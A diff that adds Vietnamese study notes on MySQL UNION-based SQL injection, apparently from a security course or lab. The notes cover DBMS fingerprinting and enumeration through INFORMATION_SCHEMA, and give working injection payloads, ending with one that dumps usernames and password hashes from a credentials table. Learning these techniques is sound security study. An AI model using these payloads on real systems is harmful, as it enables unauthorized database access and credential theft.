@@ -1,0 +1,55 @@
+Tổng quan 
+
+Fingerprint DBMS → @@version, POW(), SLEEP().
+Liệt kê database → INFORMATION_SCHEMA.SCHEMATA.
+Xác định current DB → database().
+Liệt kê bảng → INFORMATION_SCHEMA.TABLES.
+Liệt kê cột → INFORMATION_SCHEMA.COLUMNS.
+Dump dữ liệu → UNION SELECT ….
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+Chi tiết 
+
+1. MySQL Fingerprinting
+  Trước khi khai thác, cần xác định DBMS là gì.
+  Một số payload phổ biến để fingerprint MySQL:
+  SELECT @@version → trả về version (ví dụ: 10.3.22-MariaDB-1ubuntu1).
+  SELECT POW(1,1) → trả về kết quả 1.
+  SELECT SLEEP(5) → làm chậm response 5 giây.
+
+2. INFORMATION_SCHEMA Database
+  Là database chứa metadata về databases, tables, columns.
+  Muốn dump dữ liệu qua SQLi bằng UNION, cần biết:
+  Danh sách database
+  Danh sách table trong mỗi database
+  Danh sách column trong mỗi table
+
+3. SCHEMATA
+  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+  Payload SQLi:
+    ' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+  mysql
+  information_schema
+  performance_schema
+  sys
+
+4. database() (Current DB)
+  Lấy database hiện tại: SELECT database();
+  Payload SQLi: ' UNION SELECT 1,database(),2,3-- -
+
+5. TABLES (Danh sách bảng)
+  Từ INFORMATION_SCHEMA.TABLES, cần quan tâm:
+    TABLE_SCHEMA (database nào)
+    TABLE_NAME (tên bảng).
+  Payload SQLi:  ' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
+
+6. COLUMNS (Danh sách cột)
+  Từ INFORMATION_SCHEMA.COLUMNS, cần quan tâm:
+    COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA.
+  Payload SQLi: ' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials' AND table_schema='dev'-- -
+
+7. Dump dữ liệu thật
+  Sau khi biết cột, có thể dump dữ liệu trực tiếp: ' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
+  Kết quả: lấy được username, password hash, thậm chí API key.
+
